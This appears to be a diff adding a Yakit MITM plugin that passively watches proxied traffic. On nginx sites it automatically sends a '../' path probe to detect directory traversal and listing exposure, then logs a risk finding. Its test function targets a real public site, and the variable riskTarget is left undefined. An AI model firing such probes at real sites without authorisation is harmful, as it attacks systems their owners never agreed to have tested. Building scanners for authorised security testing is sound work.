@@ -1,0 +1,93 @@
+# mitm plugin template
+
+yakit_output(MITM_PARAMS)
+
+#-----------------------MITM Hooks I/O-------------------------
+/*
+#如何使用插件参数？
+
+## 例如，如果你设置了一个参数为 url_keyword 的参数，可以通过 MITM_PARAMS 来使用它！
+urlKeyword = MITM_PARAMS["url_keyword"]
+
+# 如何输出给 Yakit 给用户查看？
+
+yakit_output(i: any) // 可以只输出到 "Console 界面"
+yakit_save(i: any)   // 可以输出并保存到数据库中，在 "插件输出" 中查看
+*/
+#----------------MITM Hooks Test And Quick Debug-----------------
+/*
+# __test__ 是 yakit mitm 插件用于调试的函数 【注意：这个函数在 MITM hooks劫持环境下不会被导入】
+
+在这个函数中，你可以使用 yakit.GenerateYakitMITMHooksParams(method: string, url: string, opts ...http.Option) 来方便的生成可供 hooks 调用的参数，参考代码模版中的用法～
+
+*/
+
+
+#--------------------------WORKSPACE----------------------------
+
+checkServer = func(rsp){
+    headers,body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
+    if  str.MatchAllOfRegexp(headers, "Server: .*((?i)nginx).*") && str.MatchAllOfSubString(headers, "HTTP/1.1 200"){
+        return true
+    }
+    return false
+
+}
+
+sendExp = func(isHttps,url,req,rsp){
+    oHeaders, oBody = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
+    urlIns,err = str.ParseStringUrlToUrlInstance(url)
+
+    freq,err = fuzz.HTTPRequest(req,fuzz.https(isHttps))
+    // r,err = re.Compile(`/.*?/`)
+    // path = r.FindAllStringSubmatch(string(urlIns.path),-1)
+
+    if str.EndsWith(urlIns.path, "/") {
+        path = str.TrimRight(urlIns.path,"/")
+        // dump(path)
+        npath = path+"../"
+        prsp,err = freq.FuzzPath(npath).ExecFirst()
+        pHeaders,pBody = str.SplitHTTPHeadersAndBodyFromPacket(prsp.ResponseRaw)
+        if !str.MatchAllOfSubString(pHeaders, "HTTP/1.1 200"){
+            return
+        }
+        if str.MatchAllOfSubString(pBody, str.f("Index of %v",npath)) {
+            risk.NewRisk(
+            riskTarget, risk.severity("low"), risk.type("poc"),
+            risk.title("Nginx 目录遍历漏洞"),            ## English Title for Risk
+            risk.titleVerbose("Nginx 目录遍历漏洞"),           ##  中文标题
+            risk.details({
+                "target": prsp.Url,
+                "request": prsp.RequestRaw,
+                "response": prsp.ResponseRaw,
+                }),
+            )
+        }
+
+    }
+
+    return
+
+}
+
+
+
+__test__ = func() {
+    rsp, err := http.Get("https://developer.wordpress.org/rest-api/reference/users/1231321")
+    dump(err)
+    
+
+    mirrorNewWebsitePath(false,"https://developer.wordpress.org/rest-api/reference/users/",nil,http.dump(rsp)[0],nil)
+}
+
+
+
+
+# mirrorNewWebsitePath 每新出现一个网站路径，关于这个网站路径的第一个请求，将会在这里被传入回调
+mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
+    if checkServer(rsp){
+        // dump(rsp)
+        sendExp(isHttps,url,req,rsp)
+    }
+}
+
